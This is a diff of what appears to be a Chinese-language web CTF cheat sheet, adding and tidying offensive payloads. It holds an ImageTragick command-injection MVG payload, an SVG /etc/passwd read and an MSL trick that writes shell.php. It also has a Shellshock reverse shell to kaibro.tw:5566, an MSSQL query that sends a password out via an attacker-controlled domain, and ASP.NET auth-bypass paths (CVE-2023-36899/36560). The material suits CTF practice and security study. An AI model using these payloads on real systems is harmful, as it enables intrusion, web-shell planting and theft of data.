@@ -924,6 +924,13 @@ echo file_get_contents('bar/etc/passwd');
         - `<s/trong>b</strong>`
     - Example: [zer0pts CTF 2020 - MusicBlog](https://github.com/w181496/CTF/tree/master/zer0pts2020/MusicBlog)
 
+- mb_strpos / mb_substr
+    - 當 `mb_strpos` 讀到 utf-8 leading byte ，他會繼續嘗試往下讀; 遇到 invalid byte 時，前面的內容會被當成一個 character
+        - Example: `mb_strpos("\xf0\x9fAAA<BB", '<')` -> `4` 
+    - 而 `mb_substr` 則有不一致，當遇到 leading byte 時，會跳過 continuation bytes
+        - Example: `mb_substr("\xf0\x9fAAA<BB", 0, 4)` -> `"\xf0\x9fAAA<B"`
+    - ref: [Joomla XSS](https://www.sonarsource.com/blog/joomla-multiple-xss-vulnerabilities/)
+
 # Command Injection
 
 ```
@@ -993,15 +1000,36 @@ PS1=$(cat flag)
 ## ImageMagick (ImageTragick)
 
 - CVE-2016-3714
-- `mvg` 格式包含 https 處理(使用 curl 下載)，可以閉合雙引號
-- payload:
+    - `mvg` 格式包含 https 處理(使用 curl 下載)，可以閉合雙引號
+    - payload:
+    ```mvg
+    push graphic-context
+    viewbox 0 0 640 480
+    fill 'url(https://kaibro.tw";ls "-la)'
+    pop graphic-context
+    ```
+- Example
+    - [Google CTF 2019 - GPhotos](https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/)
+        - `Some Debians appear to have insecure ImageMagick configuration by default`
+        - read file:
+        ```xml
+        <?xml version="1.0" encoding="UTF-8"?>
+        <svg width="120px" height="120px">
+          <image width="120" height="120" href="text:/etc/passwd" />
+        </svg>
+        ```
+        - copy file (MSL):
+        ```xml
+        <image>    <!-- ImageMagick's legend is "image processing" so the tag is named "image". -->
+          <read filename="image.png" />    <!-- To make the legend more compelling "image.png" is checked to be a valid image file. -->
+          <write filename="/var/www/html/shell.php" />    <!-- This line gives access to a hacker accomplishing the mission of the MSL format and ImageMagick in general -->
+        </image>
+        ```
+    - [TokyoWesterns CTF 2018 - Slack emoji converter](https://ctftime.org/writeup/10912)
+        - ghostscript RCE
+    - [TokyoWesterns CTF 2019 - Slack emoji converter Kai](https://balsn.tw/ctf_writeup/20190831-tokyowesternsctf/#slack-emoji-converter-kai-(unsolved))
+        - ghostscript RCE
 
-```mvg
-push graphic-context
-viewbox 0 0 640 480
-fill 'url(https://kaibro.tw";ls "-la)'
-pop graphic-context
-```
 
 ## Ruby Command Executing
 
@@ -1473,7 +1501,7 @@ pop graphic-context
     - `+`
     - `'a'+'b' => 'ab'`
 - Delay function
-    - `WAIT FOR DELAY '0:0:10'`
+    - `WAITFOR DELAY '0:0:10'`
 - 空白字元
     - `01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20`
 - IF 語句
@@ -1503,7 +1531,7 @@ pop graphic-context
 - 當前角色是否為資料庫管理員
     - `SELECT is_srvrolemember('sysadmin')`
 - 當前角色是否為db_owner
-    - `SELECT  IS_MEMBER('db_owner')`
+    - `SELECT IS_MEMBER('db_owner')`
 - 爆DB name
     - ```DB_NAME(N)```
     - ```UNION SELECT NULL,DB_NAME(N),NULL--```
@@ -1539,8 +1567,8 @@ pop graphic-context
     - `fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.oob.kaibro.tw',default)`
         - Requires the CONTROL SERVER permission.
 - 判斷是否站庫分離
-    - 客戶端主機名：`select host_name();`
-    - 服務端主機名：`select @@servername; `
+    - 客戶端主機名: `select host_name();`
+    - 服務端主機名: `select @@servername;`
     - 兩者不同即站庫分離
 
 - 讀檔
@@ -2066,6 +2094,7 @@ HQL injection example (pwn2win 2017)
 - `C:\Windows\System32\inetsrv\config\ApplicationHost.config`
 - `C:\WINDOWS\debug\NetSetup.log`
 - `C:\WINDOWS\pfro.log`
+- `C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config`
 
 ## 環境變數
 
@@ -3719,6 +3748,17 @@ https://csp-evaluator.withgoogle.com/
         - `https://accounts.google.com/o/oauth2/revoke?callback=alert(1)`
         - `https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1`
     - [JSONBee](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
+- PHP Warnings
+    - In PHP, when you return any body data before `header()` is called, the call will be ignored because the response was already sent to the user and headers must be sent first.
+    - Parameters Limit
+        - `$_GET` / `$_POST`: maximum 1000 parameters
+        - A request containing more than 1000 GET parameters, a warning will be sent, and the CSP header won't
+    - Buffering
+        - PHP is known for buffering the response to 4096 bytes by default
+    - ref: 
+        - [pilvar's challenge](https://twitter.com/pilvar222/status/1784618120902005070)
+        - [justCTF 2020 - BabyCSP](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points)
+
 ### Upload XSS
 
 - htm
@@ -3944,7 +3984,7 @@ alert(window.test1.test2);  //  x:alert(1)
     - 透過 CSS `-webkit-user-modify:read-write` 屬性，可以讓 shadow DOM 做到 `contenteditable` 效果
     - `window.find()` 可以 focus shadow DOM 中的內容
     - 之後就能用 `document.execCommand()` 去插入 HTML，透過 svg 執行 JS 取得節點
-        - `document.execCommand('insertHTML',false,'<svg/onload=alert(this.parentNode.innerHTML)>')">`
+        - `document.execCommand('insertHTML',false,'<svg/onload=alert(this.parentNode.innerHTML)>')`
 - Example
     - [Dice CTF 2022 - shadow](https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md)
     - [HITCON CTF 2022 - Self Destruct Message](https://blog.splitline.tw/hitcon-ctf-2022/)
@@ -4166,12 +4206,12 @@ state[i] = state[i-3] + state[i-31]`
     - `() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'`
 
 - X-forwarded-for 偽造來源IP
-    - Client-IP
-    - X-Client-IP
-    - X-Real-IP
-    - X-Remote-IP
-    - X-Remote-Addr
-    - X-Host
+    - `Client-IP`
+    - `X-Client-IP`
+    - `X-Real-IP`
+    - `X-Remote-IP`
+    - `X-Remote-Addr`
+    - `X-Host`
     - ...
     - 各種繞 Limit (e.g. Rate limit bypass)
     - Heroku feature
@@ -4187,8 +4227,27 @@ state[i] = state[i-3] + state[i-31]`
 - IIS 短檔名列舉
     - Windows 8.3 格式: `administrator` 可以簡寫成 `admini~1`
     - 原理：短檔名存在或不存在，伺服器回應內容不同
-    - Tool: https://github.com/irsdl/IIS-ShortName-Scanner
-        - `java -jar iis_shortname_scanner.jar 2 20 http://example.com/folder/`
+    - Example
+        - MidnightSun CTF 2024 - ASPowerTools
+            - `webClient.DownloadString("http://../inetpub/wwwroot/aspowertools/FLAGFL~1.MAS")`
+    - Tool:
+        - https://github.com/irsdl/IIS-ShortName-Scanner
+            - `java -jar iis_shortname_scanner.jar 2 20 http://example.com/folder/`
+        - https://github.com/sw33tLie/sns
+- ASP.net Cookieless DuoDrop (CVE-2023-36899 & CVE-2023-36560)
+    - CVE-2023-36899
+        - `/WebForm/(S(X))/prot/(S(X))ected/target1.aspx`
+        - `/WebForm/(S(X))/b/(S(X))in/target2.aspx`
+    - CVE-2023-36560
+        - `/WebForm/pro/(S(X))tected/target1.aspx/(S(X))/`
+        - `/WebForm/b/(S(X))in/target2.aspx/(S(X))/`
+    - Example
+        - MidnightSun CTF 2024 - ASPowerTools
+            - `/(S(x))/b/(S(x))in/ASPowerTools.dll`
+            - `/(S(X))/prot/(S(X))ected/login.aspx`
+    - ref:
+        - [Cookieless DuoDrop: IIS Auth Bypass & App Pool Privesc in ASP.NET Framework (CVE-2023-36899 & CVE-2023-36560)](https://soroush.me/blog/2023/08/cookieless-duodrop-iis-auth-bypass-app-pool-privesc-in-asp-net-framework-cve-2023-36899/)
+        - [Source Code Disclosure in ASP.NET apps](https://swarm.ptsecurity.com/source-code-disclosure-in-asp-net-apps/)
 
 - NodeJS unicode failure
     - 內部使用 UCS-2 編碼
